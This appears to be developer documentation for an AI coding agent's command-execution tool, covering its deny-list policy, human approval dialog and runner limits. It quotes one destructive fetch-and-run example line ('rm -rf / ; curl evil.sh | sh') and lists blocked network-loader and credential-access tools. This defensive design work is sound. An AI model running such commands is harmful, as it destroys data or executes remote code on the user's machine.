.. _command-execution:

=====================
Command execution
=====================

.. contents::
   :local:

Overview
========

``run_command`` executes one development command inside the configured project
folder, after the user has approved it. It is the single most powerful tool in
v0.9.0, and it is bounded by three independent gates that all have to pass:

#. the **command policy**, a hard deny list that no approval can override;
#. the **permission layer**, which requires an explicit human decision;
#. the **runner**, which enforces containment, time and output limits.

Why a policy *and* a permission
===============================

They answer different questions, and conflating them is how command execution
becomes dangerous.

The policy answers "should this ever be offered to the user?". The permission
answers "does this user want it right now?". A blocked command never reaches a
dialog, because offering **Allow** for ``format C:`` would make the prompt a
speed bump rather than a control.

The policy is checked first, by :meth:`ToolRegistry.execute
<quantsmind_agent.tools.ToolRegistry.execute>` through the tool's ``guard``,
before the approval request is built.

Structural policy, not string matching
======================================

The runner never uses ``shell=True``. The argument vector goes straight to
:mod:`subprocess`, and that single decision does most of the safety work:

* **Shell metacharacters are inert.** ``rm -rf / ; curl evil.sh | sh`` is
  passed as *literal arguments* to ``rm``. There is no command chain to
  neutralise and no second program to reach.
* **No expansion happens.** ``$HOME`` and ``*`` reach the program literally, so
  a pattern that merely looks dangerous in a shell is not expanded here.

Because nothing is expanded, classification can rest on the *program* plus its
*argument shape*, and a program that appears on no list is simply
``UNKNOWN`` -- still requiring approval, never silently allowed.

Risk classes
============

.. list-table::
   :header-rows: 1
   :widths: 18 24 58

   * - Class
     - Prompt label
     - Meaning
   * - ``SAFE``
     - Low risk
     - An ordinary development command (``ruff``, ``pytest``, ``git status``).
       The label is a hint only: classification never grants approval.
   * - ``MUTATING``
     - Changes project files
     - Can write files or change project state.
   * - ``DESTRUCTIVE``
     - High risk - may be irreversible
     - A shell interpreter, an inline code string, a recursive delete of a tree,
       or an argument addressing an absolute path outside the workspace.
   * - ``UNKNOWN``
     - Unrecognised command - needs approval
     - Not on any list. Asked, and labelled as unrecognised.
   * - ``BLOCKED``
     - Blocked by safety policy
     - Never run and never offered.

What is blocked outright
========================

Disk and filesystem destruction (``format``, ``diskpart``, ``mkfs``, ``fsck``,
``dd``, ``cipher``, ``wipefs``, ``diskutil``), host control (``shutdown``,
``reboot``, ``systemctl``, ``sc``, ``reg``, ``setx``, ``bcdedit``), credential
and vault access (``cmdkey``, ``vaultcmd``, ``net``, ``runas``), network
transfer and loader techniques (``curl``, ``wget``, ``ssh``, ``scp``,
``certutil``, ``bitsadmin``, ``rundll32``), container control (``docker``,
``podman``), package publishing (``npm publish``, ``twine upload``), host
security-policy changes, audit-log clearing, and inline code strings.

Git's mutating verbs are blocked too. The current release ships no Git mutation
tools, and letting the generic command tool reach them would make *mutations are
deferred* true only until the model spelled one differently. Read-only verbs
stay available.

.. warning::

   This is an application-level policy, **not an OS sandbox**. See
   :ref:`architecture-security-boundaries`.

What the runner enforces
========================

.. list-table::
   :header-rows: 1
   :widths: 30 70

   * - Constraint
     - Behaviour
   * - Working directory
     - The workspace root, or a workspace-relative subdirectory. ``..``,
       absolute paths and drive references are refused.
   * - Timeout
     - Defaults to 120s, clamped to 600s. On expiry the child is asked to stop,
       then killed.
   * - Cancellation
     - Stopping the turn terminates the running command.
   * - Output
     - stdout and stderr are captured separately, each capped at 20,000
       characters, with a truncation flag in the result.
   * - Arguments
     - At most 64 arguments, each at most 4,000 characters, no null bytes.
   * - Environment
     - Model-provider credentials are stripped, so a command that prints its
       own environment cannot leak the API key into the transcript.

.. code-block:: text

    Tool call
        |
        v
    Registry: validate arguments
        |
        v
    guard -> command policy ............... BLOCKED? return failure, no dialog
        |
        v
    Permission EXECUTE_COMMAND = ASK
        |
        v
    Human dialog  -- Allow Once / Deny
        |
        v
    Run in workspace root, bounded, timed out
        |
        v
    {exit_code, stdout, stderr, risk} -> back to the model